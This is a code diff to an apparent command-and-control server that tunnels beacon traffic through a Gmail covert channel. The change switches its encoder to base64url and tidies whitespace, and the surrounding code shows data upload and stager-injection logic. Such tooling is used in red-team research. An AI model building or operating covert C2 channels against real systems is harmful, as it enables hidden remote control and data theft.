@@ -27,7 +27,7 @@ C2_ARCH = "x86"
 # How long to wait (in seconds) before polling the server for new tasks/responses
 IDLE_TIME = 5
 
-ENCODER_MODULE = "encoder_base64"
+ENCODER_MODULE = "encoder_b64url"
 TRANSPORT_MODULE = "transport_gmail"
 
 ###########################################
@@ -96,7 +96,7 @@ class commonUtils(object):
 	def sendData(data):
 		# This will upload the data via the covert channel
 		# returns a confirmation that the data has been sent
-		
+
 		if args.debug:
 			print (commonUtils.color("RAW DATA TO BE SENT: ", status=False, yellow=True) + "%s") % (data)
 		# Prepares the data to be sent via the covert channel
@@ -106,7 +106,7 @@ class commonUtils(object):
 
 	@staticmethod
 	def color(string, status=True, warning=False, bold=True, yellow=False):
-		""" 
+		"""
 		Change text color for the terminal, defaults to green
 
 		Set "warning=True" for red
@@ -127,7 +127,7 @@ class commonUtils(object):
 		return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
 
 	# TODO: add a function that handles logic for when a session exits to notify the c2 controller. Right now, this could/would only ever by killing the socket.
-	#	if the spec ever changes to support restoration for sessions, then this can become a priority.
+	#       if the spec ever changes to support restoration for sessions, then this can become a priority.
 
 	@staticmethod
 	def importModule(modName, modType):
@@ -140,7 +140,7 @@ class commonUtils(object):
 		exec(importName, globals())
 
 class configureStage(object):
-	@staticmethod	
+	@staticmethod
 	def configureOptions(sock, arch, pipename, block):
 		# This whole function should eventually be refactored into an elaborate forloop so that we can
 		#   support additional beacon options down the road
@@ -310,9 +310,9 @@ def main():
 
 		# TODO: Add logic that will check and recieve a confirmation from the client that it is ready to recieve and inject the stager
 		# Poll covert channel for 'READY2INJECT' message from client
-		#	* We can make the client send out 'READY2INJECT' msg from client periodically when it doesn't have a running beacon so that we don't miss it
+		#       * We can make the client send out 'READY2INJECT' msg from client periodically when it doesn't have a running beacon so that we don't miss it
 		# if args.verbose:
-		#	print commonUtils.color("Client ready to recieve stager")
+		#       print commonUtils.color("Client ready to recieve stager")
 
 		# #####################
 
